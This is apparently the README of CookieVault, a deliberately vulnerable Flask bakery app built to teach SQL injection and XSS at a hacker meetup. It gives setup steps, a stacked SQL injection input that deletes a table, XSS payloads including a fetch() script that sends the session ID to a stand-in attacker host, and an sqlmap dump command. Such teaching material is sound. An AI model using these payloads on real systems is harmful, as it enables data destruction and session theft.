## CookieVault

Made for "Evanston Happy Hackers".

This is a simple Python+SQL app that shows how you can run a cookie bakery, and also what SQL Injection bugs are and what they can cause.

## Running

1. **Set up the virtual environment:**

    ```sh
    python3 -m venv venv
    source venv/bin/activate
    ```

2. **Install the required packages:**

    ```sh
    pip install flask
    ```

3. **Create the database and populate it with initial data:**

    ```sh
    python create_database.py
    ```

4. **Run the web application:**

    ```sh
    python run_web_app.py
    ```

5. **Access the application:**

    Open your web browser and go to `http://127.0.0.1:5000/`.

## Exploiting

To demonstrate SQL injection vulnerabilities:

1. **Update Cookie Stock:**

    - Go to the "Update Cookie Stock" section.
    - Enter a `cookie_id` and a `new_stock` value.
    - For example, to set the stock of cookie with `id=1` to 20, enter `1` for `cookie_id` and `20` for `new_stock`.

2. **SQL Injection Example:**

    - Enter a malicious input to exploit the SQL injection vulnerability that exists on the path `/update_stock`.
    - Make sure to edit the HTML form elements with `F12` to disable numeric input validation.
    - For example, to delete all cookies, enter `1; DELETE FROM cookies; --` for `cookie_id` and any value for `new_stock`.
    - This will execute the `DELETE FROM cookies` SQL command, removing all cookies from the database.

To demonstrate Cross-Site Scripting (XSS) vulnerabilities:

1. **Add Comment:**

    - Go to the "Add Comment" section.
    - Enter a comment.

2. **XSS Example:**

    - Enter a malicious script to exploit the XSS vulnerability.
    - For example, enter `<script>alert('XSS');</script>` as the comment.
    - This will execute the JavaScript code, showing an alert box with the message "XSS".

3. **Leaking Session ID:**

Enter a malicious script to leak the session ID.

For example, enter:

```js
<script>
document.addEventListener('DOMContentLoaded', function() {
    fetch('http://evil.deathstar/leak?session_id=' + document.getElementById('session_id').value);
});
</script>
```

as the comment.

This will send the session ID to the specified URL, demonstrating how XSS can be used to steal sensitive information.

Look in the F12 console to see the session ID being exfiltrated via the Network tab.


**Note:** This is for educational purposes only. Do not use SQL injection or XSS in real applications.

## Using SQLMap

   sqlmap -u "http://localhost:5000/update_stock" --data "cookie_id=1&new_stock=1" -p "cookie_id" --method POST --dump --batch